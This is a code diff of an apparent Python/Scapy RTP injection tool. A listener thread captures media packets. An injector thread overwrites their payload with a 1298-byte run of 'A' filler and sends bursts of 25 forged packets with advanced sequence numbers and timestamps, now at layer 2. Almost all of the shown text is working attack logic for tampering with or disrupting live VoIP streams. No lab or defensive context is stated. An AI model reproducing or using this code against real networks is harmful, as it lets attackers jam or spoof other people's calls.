@@ -7,7 +7,7 @@ import time
 
 def listener():
 	# Global variables to be used
-	global passedPacket, packetSem, termSem, terminate
+	global passedPacket, packetSem, termSem, terminate, filler
 	
 	printLine = "===================="
 	print printLine
@@ -103,12 +103,9 @@ def listener():
 
 			#TODO: Rebuild packet with RTP layer
 
-			newRaw = ""
+			newRaw = filler
 
-			for i in range(16, len(raw)):
-				newRaw += raw[i]
-
-			rtpLayer[Raw].load = "".join(newRaw)
+			rtpLayer[Raw].load = newRaw
 
 			packet[Raw] = rtpLayer
 
@@ -134,11 +131,8 @@ def modifyPacketPayload(packet, new_payload):
 	
 def injector():
 	# global variables to be used
-	global packetSem, terminate, passedPacket
-
-	# Filler data to replace the packet's payload (20 bytes)
-	filler = "AAAAAAAAAAAAAAAAAAAA"
-	
+	global packetSem, terminate, passedPacket, filler
+		
 	printLine = "===================="
 	print printLine
 	print "Beginning Injection Engine"
@@ -166,13 +160,19 @@ def injector():
 			print "Beginning sending burst of 25 packets"
 			for i in range(0, 25):
 				modifyPacketHeader(packet, packet.sequence + 1, packet.timestamp + 160)
-				send(packet)
+				sendp(packet)
 				print "Sending packet %d" % i
 				time.sleep(.02)
 		else:
 			# if it doesn't, release the semaphore and go back to the beginning of the loop
 			packetSem.release()
 	return
+
+	
+# Filler data to replace the packet's payload (20 bytes)
+filler = ""
+for i in range(1298):
+	filler += "A"
 	
 packetSem = threading.BoundedSemaphore(value = 1)
 termSem = threading.BoundedSemaphore(value = 1)
